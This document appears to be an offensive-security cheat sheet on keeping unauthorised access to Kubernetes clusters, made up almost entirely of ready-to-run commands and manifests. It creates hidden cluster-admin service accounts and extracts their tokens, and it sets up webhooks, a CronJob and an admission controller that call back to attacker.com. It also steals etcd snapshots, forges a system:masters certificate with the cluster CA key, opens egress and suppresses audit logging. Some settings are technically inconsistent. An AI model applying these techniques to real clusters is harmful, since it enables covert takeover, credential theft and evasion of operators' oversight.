# Kubernetes Persistence

Techniques for maintaining access to Kubernetes clusters.

## Service Account Backdoor Creation

```bash
# Create hidden service account with admin access
kubectl create serviceaccount hidden-admin -n kube-system

# Bind to cluster-admin role
kubectl create clusterrolebinding hidden-admin-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:hidden-admin

# Extract token for later use
TOKEN=$(kubectl get secret \
  $(kubectl get secret -n kube-system | grep hidden-admin | awk '{print $1}') \
  -n kube-system \
  -o jsonpath='{.data.token}' | base64 -d)

# Store token safely outside cluster
echo $TOKEN > ~/hidden-admin-token.txt

# Later, use token to access cluster
curl -k https://kubernetes.default:443/api/v1/pods \
  -H "Authorization: Bearer $TOKEN"
```

## Role-based Persistence

```bash
# Create custom role with persistent access
cat > persistent-role.yaml << 'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: persistent-access
rules:
- apiGroups: [""]
  resources: ["pods", "pods/log", "pods/exec"]
  verbs: ["get", "list", "watch", "create"]
- apiGroups: ["batch"]
  resources: ["jobs"]
  verbs: ["get", "list", "create", "patch"]
- apiGroups: ["apps"]
  resources: ["deployments"]
  verbs: ["get", "list", "create", "patch"]
EOF

kubectl apply -f persistent-role.yaml

# Create service account for persistence
kubectl create serviceaccount persistence
kubectl create clusterrolebinding persistence-binding \
  --clusterrole=persistent-access \
  --serviceaccount=default:persistence

# Token persists even if role is deleted from audit logs
```

## Webhook Persistence

```bash
# Create webhook that maintains backdoor access
cat > persistence-webhook.yaml << 'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: persistence-webhook
webhooks:
- name: persistence.attacker.com
  clientConfig:
    url: http://attacker.com:8080/maintain-access
  rules:
  - operations: ["CREATE", "UPDATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1"]
  failurePolicy: Ignore
EOF

kubectl apply -f persistence-webhook.yaml

# Webhook modifies every pod:
# - Adds backdoor sidecar
# - Injects environment variables
# - Mounts secret volumes for attacker

# Even if webhook is deleted, backdoors already deployed
```

## CronJob Persistence

```bash
# Create CronJob that maintains backdoor
cat > persistence-cronjob.yaml << 'EOF'
apiVersion: batch/v1
kind: CronJob
metadata:
  name: system-maintenance
  namespace: kube-system
spec:
  schedule: "*/5 * * * *"  # Every 5 minutes
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: backdoor-sa
          containers:
          - name: maintenance
            image: attacker.registry/maintenance:latest
            command:
            - /bin/sh
            - -c
            - |
              # Verify backdoor service account exists
              kubectl get sa hidden-admin -n kube-system || \
              kubectl create sa hidden-admin -n kube-system
              
              # Verify admin binding exists
              kubectl get clusterrolebinding hidden-admin-binding || \
              kubectl create clusterrolebinding hidden-admin-binding \
              --clusterrole=cluster-admin \
              --serviceaccount=kube-system:hidden-admin
              
              # Phone home
              curl http://attacker.com/callback?status=alive
          restartPolicy: OnFailure
EOF

kubectl apply -f persistence-cronjob.yaml

# Runs automatically, maintains backdoor indefinitely
# Recreates if deleted, self-healing
```

## Custom Admission Controller Backdoor

```bash
# Deploy malicious admission controller
cat > backdoor-controller.yaml << 'EOF'
apiVersion: v1
kind: Service
metadata:
  name: backdoor-controller
  namespace: kube-system
spec:
  ports:
  - port: 443
    targetPort: 8443
  selector:
    app: backdoor-controller
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backdoor-controller
  namespace: kube-system
spec:
  replicas: 2
  selector:
    matchLabels:
      app: backdoor-controller
  template:
    metadata:
      labels:
        app: backdoor-controller
    spec:
      serviceAccountName: backdoor-sa
      containers:
      - name: controller
        image: attacker.registry/backdoor-admission:latest
        ports:
        - containerPort: 8443
        env:
        - name: ATTACKER_URL
          value: "http://attacker.com/callback"
EOF

kubectl apply -f backdoor-controller.yaml

# Controller approves all mutations, allows all requests
# Can leak data, inject code, maintain access
```

## NetworkPolicy Bypass Persistence

```bash
# Create NetworkPolicy allowing outbound to attacker
cat > attacker-access.yaml << 'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-attacker
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
    - podSelector: {}
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: TCP
      port: 443
    - protocol: TCP
      port: 80
EOF

kubectl apply -f attacker-access.yaml

# Even if cluster has restrictive network policies
# This allows traffic to attacker infrastructure
```

## ETCD Backup Persistence

```bash
# If you can backup etcd
# You can restore cluster to earlier state, including backdoors

# Create etcd backup
kubectl exec -n kube-system \
  $(kubectl get pod -n kube-system -l component=etcd -o name | head -1) \
  -- etcdctl snapshot save /tmp/backup.db \
  --cacert /etc/kubernetes/pki/etcd/ca.crt \
  --cert /etc/kubernetes/pki/etcd/server.crt \
  --key /etc/kubernetes/pki/etcd/server.key

# Download backup
kubectl cp kube-system/etcd-pod:/tmp/backup.db ./backup.db

# Later, restore to reintroduce backdoors
# Even if cluster is "cleaned up"
```

## Pod Security Policy Bypass Persistence

```bash
# Create PSP that allows malicious workloads
cat > attacker-psp.yaml << 'EOF'
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: attacker-psp
spec:
  privileged: true
  allowPrivilegeEscalation: true
  capabilities:
    add: ["*"]
  volumes: ["*"]
  hostNetwork: true
  hostPID: true
  hostIPC: true
  runAsUser:
    rule: 'MustRunAsNonRoot'
EOF

kubectl apply -f attacker-psp.yaml

# Create ClusterRole allowing PSP use
kubectl create clusterrole use-attacker-psp --verb=use --resource=psp --resource-name=attacker-psp
kubectl create clusterrolebinding use-attacker-psp \
  --clusterrole=use-attacker-psp \
  --serviceaccount=default:default

# Now pods can be privileged, escape containers, etc.
```

## Certificate Persistence

```bash
# Create client certificate for long-term cluster access
# Even if kubeconfigs are rotated

# Generate certificate signing request
openssl req -new -newkey rsa:4096 -nodes \
  -keyout attacker.key -out attacker.csr \
  -subj "/CN=attacker/O=system:masters"

# Sign with cluster CA (if you have access)
openssl x509 -req -in attacker.csr \
  -CA /etc/kubernetes/pki/ca.crt \
  -CAkey /etc/kubernetes/pki/ca.key \
  -CAcreateserial -out attacker.crt -days 365

# Create kubeconfig
kubectl config set-cluster kubernetes --certificate-authority=/etc/kubernetes/pki/ca.crt --server=https://kubernetes:443
kubectl config set-credentials attacker --client-certificate=attacker.crt --client-key=attacker.key
kubectl config set-context kubernetes --cluster=kubernetes --user=attacker

# Certificate valid for year, persists across cluster updates
```

## API Server Audit Manipulation

```bash
# If you can modify audit policy
# You can hide malicious activity

cat > audit-policy.yaml << 'EOF'
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: None
  omitStages:
  - RequestReceived
  verbs:
  - "get"
  - "watch"
  - "list"
- level: Metadata
  omitStages:
  - RequestReceived
EOF

# Update API server to use modified audit policy
# No logs generated for your reconnaissance
# API calls to delete/modify logs won't show up
```

## Kubelet Configuration Persistence

```bash
# If you have node access
# Modify kubelet configuration for persistence

# Edit kubelet config (typically /etc/kubernetes/kubelet.conf)
# Add parameters for callback/reverse shell

echo 'serverTLSBootstrap: true
tlsCipherSuites:
  - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
readOnlyPort: 10255  # Expose read-only API
eventRecordQPS: 0  # Prevent event logging
' >> /etc/kubernetes/kubelet.conf

# Restart kubelet
systemctl restart kubelet

# Now kubelet allows anonymous access to read API
```
